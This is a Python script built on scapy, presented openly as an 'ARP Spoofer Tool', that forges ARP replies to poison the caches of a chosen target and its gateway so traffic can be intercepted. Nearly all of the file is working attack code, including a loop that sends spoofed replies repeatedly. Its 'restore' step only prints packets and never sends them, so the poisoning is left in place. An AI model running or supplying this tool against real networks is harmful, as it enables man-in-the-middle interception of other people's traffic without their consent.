from scapy.all import *
import time
import sys
import argparse
class ARP_SPOOFER:
	def __init__(self,ip1,ip2):
		print("Programming is started!")
		self.IP = ip1
		self.gate_way = ip2
	def get_mac(self,ip):
		arp_layer = ARP(pdst=ip)
		ethernet_layer = Ether(dst="ff:ff:ff:ff:ff:ff")
		arp_packet = ethernet_layer/arp_layer
		answered_list,unrespone_list = srp(arp_packet,timeout=2,verbose=False)
		for x in answered_list:
			return x[1].hwsrc
	def create_and_send_ARP_reply(self,ip1,ip2):
		mac = self.get_mac(ip2)
		arp = ARP(op=2,psrc=ip1,pdst=ip2,hwdst=mac)
		print(arp.show())
		send(arp,verbose=True)
	def restore_infor(self,ip1,ip2):
		mac = self.get_mac(ip2)
		arp = ARP(op=2,psrc=ip1,pdst=ip2,hwdst=mac)
		print(arp.show()+"\n"+arp.summary())
	def run(self):
		the_numer_of_packets = 0
		try:
			while True:
				self.create_and_send_ARP_reply(self.IP,self.gate_way)
				self.create_and_send_ARP_reply(self.gate_way,self.IP)
				the_numer_of_packets+=2
				print("\rPacket sent "+str(the_numer_of_packets))

		except KeyboardInterrupt:
			print("Quit!")
			self.restore_infor(self.IP,self.gate_way)
			self.restore_infor(self.gate_way,self.IP)
parser = argparse.ArgumentParser(description="ARP Spoofer Tool.")
parser.add_argument("IP",type=str,help="The ip that you want to spoof.")
parser.add_argument("GATEWAY",type=str,help="The default gateway of your network.")
args = parser.parse_args()
spoofer = ARP_SPOOFER(args.IP,args.GATEWAY)
spoofer.create_and_send_ARP_reply(args.IP,args.GATEWAY)